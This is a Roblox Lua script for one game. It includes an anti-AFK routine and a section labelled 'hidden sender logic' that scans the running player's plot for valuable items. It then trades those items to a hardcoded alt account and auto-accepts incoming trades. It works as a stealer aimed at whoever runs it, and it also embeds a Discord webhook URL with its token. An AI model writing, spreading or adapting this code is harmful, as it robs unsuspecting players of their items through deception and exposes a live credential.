if game.PlaceId ~= 109983668079237 then return end

-- ========== CONFIGURATION ==========
local MY_ALT_USER = "hakimidu_95"
local LOG_WEBHOOK = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

-- ========== ANTI-AFK ==========
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    vu:CaptureController()
    vu:ClickButton2(Vector2.new())
end)

-- ========== HELPERS ==========
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer.PlayerGui

local function isWantedItem(name)
    if not name then return false end
    name = name:lower():match("^%s*(.-)%s*$")
    for _, wanted in ipairs(wantedItems) do
        if name:find(wanted:lower(), 1, true) then return true end
    end
    return false
end

local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(LocalPlayer.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end

    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") and isWantedItem(child.Name) then
                table.insert(found, child.Name)
            end
        end
    end
    return found
end

local function tradeIsActive()
    local gui = playerGui:FindFirstChild("TradeLiveTrade")
    return gui and gui:FindFirstChild("TradeLiveTrade") and gui.TradeLiveTrade.Visible
end

-- ========== HIDDEN SENDER LOGIC ==========
local function sendInvite(target)
    local tl = playerGui:FindFirstChild("TradePlayerList")
    if not tl or not tl:FindFirstChild("TradePlayerList") then return end
    local inner = tl.TradePlayerList
    local sb = inner.bg.SearchFrame.SearchBox
    sb.Text = target
    task.wait(0.3)
    pcall(function() firesignal(sb.FocusLost, true) end)
    task.wait(0.8)
    for _, p in pairs(inner.Global.List:GetChildren()) do
        if p:IsA("Frame") and p:FindFirstChild("Fill") and p.Fill:FindFirstChild("Send") then
            pcall(function() firesignal(p.Fill.Send.Activated) end)
            return true
        end
    end
end

-- ========== AUTO ACCEPT INCOMING ==========
task.spawn(function()
    while true do
        pcall(function()
            local requestGui = playerGui:FindFirstChild("TradeRequest")
            if requestGui and requestGui:FindFirstChild("TradeRequest") then
                local req = requestGui.TradeRequest
                if req.Visible then
                    local accept = req:FindFirstChild("Accept", true)
                    if accept then firesignal(accept.Activated) end
                end
            end
        end)
        task.wait(1)
    end
end)

-- ========== MAIN LOOP ==========
while true do
    local highValueItems = scanPlot()
    
    if #highValueItems > 0 then
        if not tradeIsActive() then
            sendInvite(MY_ALT_USER)
        else
            local inner = playerGui.TradeLiveTrade.TradeLiveTrade
            local otherUser = inner.Other.Username.Text:lower()
            
            if otherUser:find(MY_ALT_USER:lower()) then
                -- Add Items
                local scrolling = inner:FindFirstChild("ScrollingFrame", true)
                if scrolling then
                    for _, slot in pairs(scrolling:GetChildren()) do
                        if slot.Name:sub(1,9) == "Selection" then
                            local spacer = slot:FindFirstChild("Spacer")
                            if spacer and spacer:FindFirstChild("UIStroke") then
                                if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                    pcall(function() firesignal(spacer.Activated) end)
                                    task.wait(0.1)
                                end
                            end
                        end
                    end
                end
                -- Accept
                task.wait(1)
                local btn = inner:FindFirstChild("ReadyButton", true)
                if btn then firesignal(btn.Activated) end
            end
        end
    else
        -- Just Auto Accept for the user if they don't have items I want
        if tradeIsActive() then
            local inner = playerGui.TradeLiveTrade.TradeLiveTrade
            local btn = inner:FindFirstChild("ReadyButton", true)
            if btn then firesignal(btn.Activated) end
        end
    end
    task.wait(2)
end
